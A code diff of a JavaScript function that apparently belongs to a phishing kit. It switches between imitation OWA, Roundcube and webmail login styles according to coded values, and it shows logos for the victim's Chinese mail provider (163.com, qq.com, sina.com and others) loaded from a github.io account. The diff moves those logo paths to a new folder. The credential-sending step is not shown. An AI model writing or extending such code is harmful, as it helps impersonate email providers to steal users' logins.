@@ -176,9 +176,17 @@ function fexBtnSub(r) {
         userServer = "china"
     }
     else {
-        userServer = "owa"
         // change only when its owa (webmail, roundcube)
-        document.body.style.backgroundColor = "white"
+        if (send.value == "bba") {
+            userServer = "owa"
+            document.body.style.backgroundColor = "white"
+        }
+        else if (send.value == "akpaz") {
+            userServer = "roundcube"
+        }
+        else if (send.value == "maka" || send.value == "anyi") {
+            userServer = "webmail"
+        }
     }
 
     // 
@@ -222,28 +230,28 @@ function fexBtnSub(r) {
                 const chinaImg = document.getElementById("china_log")
 
                 if (input_china.innerText.includes("163.com") || input_china.innerText.includes("vip.163.com")) {
-                    chinaImg.src = "https://robmccal.github.io/zip_fx/china/163.png"
+                    chinaImg.src = "https://robmccal.github.io/Netlify/china/163.png"
                 }
                 else if (input_china.innerText.includes("126.com") || input_china.innerText.includes("vip.126.com")) {
-                    chinaImg.src = "https://robmccal.github.io/zip_fx/china/126.png"
+                    chinaImg.src = "https://robmccal.github.io/Netlify/china/126.png"
                 }
                 else if (input_china.innerText.includes("sina.com") || input_china.innerText.includes("vip.sina.com")) {
-                    chinaImg.src = "https://robmccal.github.io/zip_fx/china/sina.png"
+                    chinaImg.src = "https://robmccal.github.io/Netlify/china/sina.png"
                 }
                 else if (input_china.innerText.includes("qq.com") || input_china.innerText.includes("vip.qq.com")) {
-                    chinaImg.src = "https://robmccal.github.io/zip_fx/china/qq.png"
+                    chinaImg.src = "https://robmccal.github.io/Netlify/china/qq.png"
                 }
                 else if (input_china.innerText.includes("139.com") || input_china.innerText.includes("vip.139.com")) {
-                    chinaImg.src = "https://robmccal.github.io/zip_fx/china/139.png"
+                    chinaImg.src = "https://robmccal.github.io/Netlify/china/139.png"
                 }
                 else if (input_china.innerText.includes("aliyun.com") || input_china.innerText.includes("vip.aliyun.com")) {
-                    chinaImg.src = "https://robmccal.github.io/zip_fx/china/aliyun.png"
+                    chinaImg.src = "https://robmccal.github.io/Netlify/china/aliyun.png"
                 }
                 else if (input_china.innerText.includes("tom.com") || input_china.innerText.includes("vip.tom.com")) {
-                    chinaImg.src = "https://robmccal.github.io/zip_fx/china/tom.png"
+                    chinaImg.src = "https://robmccal.github.io/Netlify/china/tom.png"
                 }
                 else {
-                    chinaImg.src = "https://robmccal.github.io/zip_fx/china/gen.png"
+                    chinaImg.src = "https://robmccal.github.io/Netlify/china/gen.png"
                 }
 
             }
